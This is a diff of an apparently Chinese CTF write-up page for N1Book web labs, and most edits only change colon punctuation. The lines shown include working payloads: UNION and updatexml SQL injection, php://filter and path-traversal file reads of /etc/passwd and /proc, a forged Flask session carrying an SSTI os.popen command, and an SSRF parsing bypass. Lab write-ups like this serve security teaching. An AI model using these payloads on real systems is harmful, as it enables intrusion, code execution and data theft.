 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210703192042581.png alt=image-20210703192042581>
@@ -221,7 +221,7 @@ Disallow:
 <p>Des:看看能不能找到信息吧?</p>
 </blockquote>
 <h4 id=环境搭建-1>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建-1>#</a></h4>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3.2&#39;</span>
 
 <span style=color:#f92672>services</span>:
@@ -229,7 +229,7 @@ Disallow:
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest</span>
     <span style=color:#f92672>ports</span>:
       - <span style=color:#ae81ff>80</span>:<span style=color:#ae81ff>80</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h4 id=解题过程-1>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程-1>#</a></h4>
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210703200103247.png alt=image-20210703200103247>
@@ -242,7 +242,7 @@ Disallow:
 <p>Des:N/A。</p>
 </blockquote>
 <h4 id=环境搭建-2>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建-2>#</a></h4>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3.2&#39;</span>
 
 <span style=color:#f92672>services</span>:
@@ -250,30 +250,30 @@ Disallow:
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-1:latest</span>
     <span style=color:#f92672>ports</span>:
       - <span style=color:#ae81ff>80</span>:<span style=color:#ae81ff>80</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h4 id=解题过程-2>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程-2>#</a></h4>
-<p>访问后发现<code>URL</code>如下:</p>
+<p>访问后发现<code>URL</code>如下：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.php?id=1
 </code></pre><p>猜测<code>id</code>是注入点。</p>
-<p>判断是否为数字型注入:</p>
+<p>判断是否为数字型注入：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.php?id=1-1
-</code></pre><p>页面无变化，继续判断是否为字符型注入:</p>
+</code></pre><p>页面无变化，继续判断是否为字符型注入：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.php?id=1'
-</code></pre><p>页面错误，用联合查询看一下有几列数据:</p>
+</code></pre><p>页面错误，用联合查询看一下有几列数据：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.php?id=-1%27union%20select%201,2,3%23
-</code></pre><p>查库名:</p>
+</code></pre><p>查库名：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23
-</code></pre><p>查表名:</p>
+</code></pre><p>查表名：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23
-</code></pre><p>查字段:</p>
+</code></pre><p>查字段：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.php?id=-1%27union%20select%201,fllllag,1%20from%20fl4g%23
 </code></pre><h3 id=sql注入-2>SQL注入-2<a hidden class=anchor aria-hidden=true href=#sql注入-2>#</a></h3>
 <blockquote>
 <p>Des:请访问 http://127.0.0.1/login.php http://127.0.0.1/user.php</p>
 </blockquote>
 <h4 id=环境搭建-3>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建-3>#</a></h4>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3.2&#39;</span>
 
 <span style=color:#f92672>services</span>:
@@ -281,25 +281,25 @@ Disallow:
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-2:latest</span>
     <span style=color:#f92672>ports</span>:
       - <span style=color:#ae81ff>80</span>:<span style=color:#ae81ff>80</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h4 id=解题过程-3>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程-3>#</a></h4>
-<p>是一个后台登录页面，尝试账密<code>admin/admin</code>，显示<code>账号或密码错误</code>，尝试<code>admin'/admin</code>，显示<code>账号不存在</code>。猜测存在<code>SQL注入</code>，用延时函数判断一下注入类型:</p>
+<p>是一个后台登录页面，尝试账密<code>admin/admin</code>，显示<code>账号或密码错误</code>，尝试<code>admin'/admin</code>，显示<code>账号不存在</code>。猜测存在<code>SQL注入</code>，用延时函数判断一下注入类型：</p>
 <pre><code>admin' and sleep(5)#
 </code></pre><p>页面回显延时5秒，存在字符型注入。继续尝试万能密码，无法登录，正确思路应该不是登录，而是通过注入获得<code>flag</code>。</p>
 <p>使用<code>bp</code>抓包进行<code>updatexml</code>报错注入。</p>
-<p><code>URL</code>:</p>
+<p><code>URL</code>：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/login.php?tips=1
-</code></pre><p>爆数据库名:</p>
+</code></pre><p>爆数据库名：</p>
 <pre><code>name=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(table_name)from information_schema.tables where table_schema=database())),1)%23&amp;pass=admin
-</code></pre><p>得到两个库名:</p>
+</code></pre><p>得到两个库名：</p>
 <pre><code>fl4g
 users
-</code></pre><p>爆表名:</p>
+</code></pre><p>爆表名：</p>
 <pre><code>name=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(column_name)from information_schema.columns where table_name='fl4g')),1)%23&amp;pass=admin
-</code></pre><p>得到一个表名:</p>
+</code></pre><p>得到一个表名：</p>
 <pre><code>flag
-</code></pre><p>爆字段:</p>
+</code></pre><p>爆字段：</p>
 <pre><code>name=admin' and updatexml(1,concat(0x7e,(seleselectct (flag)from fl4g)),1)%23&amp;pass=admin
 </code></pre><h2 id=任意文件读取漏洞>任意文件读取漏洞<a hidden class=anchor aria-hidden=true href=#任意文件读取漏洞>#</a></h2>
 <h3 id=afr_1>afr_1<a hidden class=anchor aria-hidden=true href=#afr_1>#</a></h3>
@@ -307,7 +307,7 @@ users
 <p>Des:N/A。</p>
 </blockquote>
 <h4 id=环境搭建-4>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建-4>#</a></h4>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3.2&#39;</span>
 
 <span style=color:#f92672>services</span>:
@@ -315,13 +315,13 @@ users
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-1:latest</span>
     <span style=color:#f92672>ports</span>:
       - <span style=color:#ae81ff>80</span>:<span style=color:#ae81ff>80</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h4 id=解题过程-4>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程-4>#</a></h4>
 <p>访问页面，会自动添加一个<code>?p=hello</code>参数，尝试修改参数值，更改了几个值页面都是空白，猜测是读写文件。那么就看一看<code>flag</code>文件是否存在，存在，但是页面回显为<code>no no no</code>。</p>
-<p>猜测使用了<code>php</code>协议的<code>filter</code>机制，尝试一下:</p>
+<p>猜测使用了<code>php</code>协议的<code>filter</code>机制，尝试一下：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/?p=php://filter/convert.base64-encode/resource=hello
-</code></pre><p>得到一个<code>Base64</code>编码的字符串，解码如下:</p>
+</code></pre><p>得到一个<code>Base64</code>编码的字符串，解码如下：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
 
 <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;hello world!&#34;</span>;
@@ -331,7 +331,7 @@ users
 <p>Des:N/A。</p>
 </blockquote>
 <h4 id=环境搭建-5>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建-5>#</a></h4>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3.2&#39;</span>
 
 <span style=color:#f92672>services</span>:
@@ -339,10 +339,10 @@ users
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-2:latest</span>
     <span style=color:#f92672>ports</span>:
       - <span style=color:#ae81ff>80</span>:<span style=color:#ae81ff>80</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h4 id=解题过程-5>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程-5>#</a></h4>
-<p>页面源码如下:</p>
+<p>页面源码如下：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>html</span>&gt;
 &lt;<span style=color:#f92672>head</span>&gt;
     &lt;<span style=color:#f92672>title</span>&gt;u1s1&lt;/<span style=color:#f92672>title</span>&gt;
@@ -353,7 +353,7 @@ HELLO!
 &lt;/<span style=color:#f92672>body</span>&gt;
 &lt;/<span style=color:#f92672>html</span>&gt;
 </code></pre></div><p>看看能否访问<code>img</code>目录，成功。看了一下网站服务，发现使用了<code>nginx</code>，<strong>那就有可能出现配置不当导致的目录穿越漏洞</strong>。</p>
-<p>尝试访问如下地址:</p>
+<p>尝试访问如下地址：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/img../
 </code></pre><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210709213837751.png alt=image-20210709213837751>
 </p>
@@ -363,7 +363,7 @@ HELLO!
 <p>Des:N/A。</p>
 </blockquote>
 <h4 id=环境搭建-6>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建-6>#</a></h4>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3.2&#39;</span>
 
 <span style=color:#f92672>services</span>:
@@ -371,21 +371,21 @@ HELLO!
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-3:latest</span>
     <span style=color:#f92672>ports</span>:
       - <span style=color:#ae81ff>5000</span>:<span style=color:#ae81ff>5000</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h4 id=解题过程-6>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程-6>#</a></h4>
 <p>网页是一个输入框，且能够进行<code>XSS注入</code>。</p>
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210709214519965.png alt=image-20210709214519965>
 </p>
-<p>点击提交按钮后继续点击超链接，跳转到一个实例文章页面，<code>URL</code>如下:</p>
+<p>点击提交按钮后继续点击超链接，跳转到一个实例文章页面，<code>URL</code>如下：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/article?name=article
-</code></pre><p>尝试修改<code>name</code>的值，本来想看看是否存在<code>flag</code>文件，结果打错为<code>fkag</code>，意外爆出了路径:</p>
+</code></pre><p>尝试修改<code>name</code>的值，本来想看看是否存在<code>flag</code>文件，结果打错为<code>fkag</code>，意外爆出了路径：</p>
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210709214741536.png alt=image-20210709214741536>
 </p>
 <p>继续尝试访问<code>flag</code>文件，显示没有权限。</p>
-<p>再看看能不能读取到其它文件:</p>
+<p>再看看能不能读取到其它文件：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/article?name=../../../etc/passwd
-</code></pre><p>还可以用以下姿势来得到更多的信息:</p>
+</code></pre><p>还可以用以下姿势来得到更多的信息：</p>
 <pre><code>/proc/sched_debug	# 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
 /proc/mounts		# 挂载的文件系统列表
 /proc/net/arp		# arp表，可以获得内网其他机器的地址
@@ -397,11 +397,11 @@ HELLO!
 /proc/[PID]/environ # 程序运行的环境变量信息，可以用来包含getshell
 /proc/[PID]/cwd		# 当前进程的工作目录
 /proc/[PID]/fd/[#]	# 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
-</code></pre><p>读一下<code>cmdline</code>:</p>
+</code></pre><p>读一下<code>cmdline</code>：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/article?name=../../../proc/self/cmdline
-</code></pre><p>回显为<code>pythonserver.py</code>，猜测题目为<code>python</code>环境，那么先使用<code>cwd</code>找一下<code>server.py</code>文件:</p>
+</code></pre><p>回显为<code>pythonserver.py</code>，猜测题目为<code>python</code>环境，那么先使用<code>cwd</code>找一下<code>server.py</code>文件：</p>
 <pre><code>http://&lt;ip&gt;:&lt;port&gt;/article?name=../../../proc/self/cwd/server.py
-</code></pre><p>回显如下:</p>
+</code></pre><p>回显如下：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 <span style=color:#f92672>import</span> os
 <span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string ) 
@@ -447,13 +447,13 @@ app<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</spa
 
 <span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
     app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, debug<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
-</code></pre></div><p>盲猜<code>flag</code>在<code>flag.py</code>里，但还是无权限访问，看看<code>key.py</code>，内容如下:</p>
+</code></pre></div><p>盲猜<code>flag</code>在<code>flag.py</code>里，但还是无权限访问，看看<code>key.py</code>，内容如下：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Drmhze6EPcv0fN_81Bj-nA&#39;</span>
-</code></pre></div><p>通过插件发现网站使用<code>flask</code>框架，应该有<code>SSTI</code>模板注入，注意到<code>server.py</code>里的过滤语句:</p>
+</code></pre></div><p>通过插件发现网站使用<code>flask</code>框架，应该有<code>SSTI</code>模板注入，注意到<code>server.py</code>里的过滤语句：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>if</span> n1code <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
         n1code <span style=color:#f92672>=</span> n1code<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;.&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;_&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;{&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;}&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>)
-</code></pre></div><p>还有下面的这两句:</p>
+</code></pre></div><p>还有下面的这两句：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;n1code&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> session <span style=color:#f92672>or</span> session[<span style=color:#e6db74>&#39;n1code&#39;</span>] <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
     session[<span style=color:#e6db74>&#39;n1code&#39;</span>] <span style=color:#f92672>=</span> n1code
     template <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
@@ -462,12 +462,12 @@ key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Drmhze6EPc
 </code></pre></div><p>模板渲染的内容就是<code>n1code</code>，但<code>n1code</code>的来源可以为<code>session</code>，我们就可以利用<code>flask</code>的<code>session</code>伪造查看<code>flag</code>。</p>
 <p>伪造<code>session</code>需要一个密钥，密钥就是<code>key.py</code>中的那一个字符串。</p>
 <p><code>flask session</code>加密脚本:<a href=https://github.com/noraj/flask-session-cookie-manager>noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)</a></p>
-<p>构造语句:</p>
+<p>构造语句：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>{<span style=color:#e6db74>&#39;n1code&#39;</span>: <span style=color:#e6db74>&#39;{{</span><span style=color:#ae81ff>\&#39;\&#39;</span><span style=color:#e6db74>.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>os</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>].popen(</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>cat flag.py</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>).read()}}&#39;</span>}
-</code></pre></div><p>工具使用:</p>
+</code></pre></div><p>工具使用：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>./</span>flask_session_cookie_manager3<span style=color:#f92672>.</span>py encode <span style=color:#f92672>-</span>s <span style=color:#e6db74>&#34;Drmhze6EPcv0fN_81Bj-nA&#34;</span> <span style=color:#f92672>-</span>t <span style=color:#e6db74>&#34;{&#39;n1code&#39;: &#39;{{</span><span style=color:#ae81ff>\&#39;\&#39;</span><span style=color:#e6db74>.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>os</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>].popen(</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>cat flag.py</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>).read()}}&#39;}&#34;</span>
 <span style=color:#f92672>.</span>eJwdikEKgCAQAL8SX1YvQ12CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAP1jNjoOBnRDHPDfC<span style=color:#f92672>-</span>_961IZcb<span style=color:#f92672>-</span>k3vcr3_cAi8UWjLAGWad0PkowdLVrYE2nR5Q<span style=color:#f92672>-</span>vTkpKpV1BcrHygP<span style=color:#f92672>.</span>X6pHGQ<span style=color:#f92672>.</span>HTAUFHnMrWWCCfiRJXBNyUdj4IY
-</code></pre></div><p>发包:</p>
+</code></pre></div><p>发包：</p>
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210712174647213.png alt=image-20210712174647213>
 </p>
 <h1 id=第二章-web进阶>第二章 Web进阶<a hidden class=anchor aria-hidden=true href=#第二章-web进阶>#</a></h1>
@@ -480,7 +480,7 @@ key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Drmhze6EPc
 <p>vulnweb容器中内置一个 <code>fpm.py</code> 攻击脚本</p>
 </blockquote>
 <h3 id=环境搭建-7>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建-7>#</a></h3>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#34;3&#34;</span>
 <span style=color:#f92672>services</span>:
   <span style=color:#f92672>web</span>:
@@ -502,12 +502,12 @@ key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Drmhze6EPc
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-4:latest</span>
     <span style=color:#f92672>environment</span>:
       - <span style=color:#ae81ff>MYSQL_RANDOM_ROOT_PASSWORD=yes</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h3 id=解题过程-7>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程-7>#</a></h3>
-<p>想直接访问<code>flag.php</code>，直接就出来了:</p>
+<p>想直接访问<code>flag.php</code>，直接就出来了：</p>
 <pre><code>http://127.0.0.1/flag.php
-</code></pre><p>正确思路应该是利用<code>URL</code>解析差异，如:</p>
+</code></pre><p>正确思路应该是利用<code>URL</code>解析差异，如：</p>
 <pre><code>http://x@127.0.0.1:80@google.com/flag.php
 </code></pre><p>进入<code>safe_request_curl</code>后，<code>curl</code>获取到的是<code>127.0.0.1:80/flag.php</code>，<code>parse_url</code>获取到的<code>host</code>是<code>google.com</code>，利用解析差异实现<code>SSRF</code>攻击。</p>
 <blockquote>
@@ -520,10 +520,10 @@ key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Drmhze6EPc
 <li><a href=https://oopsdc.tk/tags/ctf/>CTF</a></li>
 </ul>
 <nav class=paginav>
-<a class=prev href=https://oopsdc.tk/post/proxychains/>
+<a class=prev href=https://oopsdc.tk/post/proxychains%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/>
 <span class=title>« Prev Page</span>
 <br>
-<span>ProxyChains</span>
+<span>ProxyChains简单使用</span>
 </a>
 <a class=next href=https://oopsdc.tk/post/%E8%87%AA%E5%AE%9A%E4%B9%89github%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99/>
 <span class=title>Next Page »</span>
